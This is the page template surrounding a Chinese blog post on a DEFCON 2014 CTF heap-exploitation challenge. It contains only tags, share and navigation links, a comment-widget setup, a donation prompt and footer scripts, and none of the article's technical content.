	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&title=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&title=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2019/04/01/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%80%BB%E7%BB%9301/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Pwn学习笔记:总结01</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2019/03/26/DEFCON-2014-CTF-Baby-s-First-heap-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%8F%8A%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">DEFCON 2014 CTF-Baby&#39;s First-heap 基本知识及静态分析</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&title=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&title=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit》 — 喵喵喵喵&url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAAD3ElEQVR42u3a22rdQAwF0P7/T7f0rRDi7C3JKYHlp4Njj8fLBVWXX7/i4/eH49/zz3d99vvjve1Tntd83tvqwIEDBw4c5at+tnT7Glcvn+8tOfO8Wxw4cODAccWRh8n83nxbycptUB/uHwcOHDhwfDvHLJRu7k1C/jMfDhw4cOD4KRx5yHy+ZnZXHqpx4MCBA8f3cyQFuNtAmzPl0G3qiAMHDhw43uDIw97P/f3KfAcOHDhw4BgFqjwg3V4/azJtDhw4cODAsefIA1I7mrCP/+343fNAQ/5eOHDgwIFjz7FJhNoxglUIHBU0Z4EcBw4cOHDMOGajCe22Zle+UQf9YjUcOHDgwHHKsS/btUG3jW550th+YBw4cODAccWRFP7ycltbKMxLfvsPk5QUceDAgQPHnqMNbG0iNxtQmKWU7VvgwIEDB443ONpEK2nwbIYkZlfO9hzNd+DAgQMHjpJjNhawKfPNRhZaxOFABg4cOHDgWHO0DaFZCteOTbS4t9fgwIEDB449xyzozkLjJkXcJHh1yRIHDhw4cKz7LLMWVE7ZbrQdR5glikVeiwMHDhw4Ao684TQLyW3xrqWZDTd80XbCgQMHDhwLjtl4wSZxagPq7QhF0ZTCgQMHDhwjjjxcJSEqWe2ginm0Pg4cOHDgeIOjHQWYBcu2tNc2tNohjC+SPRw4cODAseZIXqDoYo3SsDwBm32AdggDBw4cOHDMOG630p7ZlCDbkYVoZRw4cODAseZIlk7SsHa4oS1Kbkb06hIkDhw4cOBYc+xfOy/5XcFd0X/xbwQHDhw4cIzOtIMI7ZVJm+eNLzxM83DgwIEDx4JjFjJn7ag8VOfXJ+sX3Dhw4MCB4wWOWWhMgncbaDdnhsMTOHDgwIHjiGOT/+3LiPlzc5Tkr5+OyuHAgQMHjjVHEjKToNWCzgqFt+N6OHDgwIHjliN57VkDqW1cteFz1Wd7hsCBAwcOHAuOWXBKym3JX/OJglmLqw7GOHDgwIHjiCNpPrXNoauUb0aTt8eG8x04cODAgeORI0ly8jbSVcq3SQJbShw4cODAccVxNQw3fPD6M7wSgHHgwIEDx4Jj85hZ2W5TXpyVIAsmHDhw4MCx5siPNpGbJXj5+ELSapqtiQMHDhw49hxt4a/9nRPnXyznfl6tTuRw4MCBA0fMMRs+y9OterxgNL22+a8DDhw4cOD4Xxz5mMIm9UpaVrMxi2F7DgcOHDhwvMaRhMM2YOd7yHc1fDoOHDhw4DjiyJtJszJfu/U2TCYBOwrqOHDgwIFjzbF52CyhagfsZoN0SbPqLM3DgQMHDhx/jz9u0ElLHiIRwwAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
